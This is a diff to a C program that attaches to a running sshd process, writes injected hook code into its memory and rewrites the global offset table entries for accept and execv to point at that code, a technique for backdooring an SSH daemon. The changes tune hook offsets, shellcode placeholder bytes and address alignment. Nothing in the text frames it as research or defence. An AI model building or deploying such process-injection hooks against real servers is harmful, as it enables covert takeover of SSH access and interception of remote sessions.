@@ -26,8 +26,11 @@
 #define SSHD_PATH "/usr/sbin/sshd"
 #define SESSION_PATH "/usr/lib/ssh/sshd-session"
 
-#define MOV_RAX_CALL "\x48\xB8\xCD\xAB\x89\x67\x45\x23\x00\x00\xFF\xD0"
-#define MOV_RAX "\x48\xB8\xBC\x9A\x78\x56\x34\x12\x00\x00"
+#define ACCEPT_HOOK_OFFSET 0x0
+#define EXECV_HOOK_OFFSET 0x256
+
+#define MOV_RAX_CALL "\x48\xB8\xF0\xDE\xBC\x9A\x78\x56\x34\x12\xFF\xD0"
+#define MOV_RAX "\x48\xB8\xEF\xCD\xAB\x89\x67\x45\x23\x01"
 
 // replace the place_holder to the bytes I need
 void
@@ -74,12 +77,15 @@ main (int argc, char **argv)
   printf ("while we need 0x%lx\n",
           (sizeof (sshd_accept) + sizeof (sshd_execv)));
 
-  copy_to_tracee (pid, sshd_rx_start, sshd_accept, sizeof (sshd_accept));
-  copy_to_tracee (pid, accept_got, (uint8_t *)&sshd_rx_start, 0x8);
+  uint64_t accept_hook_start = sshd_rx_start;
+  copy_to_tracee (pid, accept_hook_start, sshd_accept, sizeof (sshd_accept));
+  accept_hook_start += ACCEPT_HOOK_OFFSET;
+  copy_to_tracee (pid, accept_got, (uint8_t *)&accept_hook_start, 0x8);
 
   uint64_t execv_hook_start
-      = (sshd_rx_start + (sizeof (sshd_accept) & ~0x7)) + 0x8;
+      = ((sshd_rx_start + sizeof (sshd_accept)) & ~0x7) + 0x8;
   copy_to_tracee (pid, execv_hook_start, sshd_execv, sizeof (sshd_execv));
+  execv_hook_start += EXECV_HOOK_OFFSET;
   copy_to_tracee (pid, execv_got, (uint8_t *)&execv_hook_start, 0x8);
 
   detach (pid);
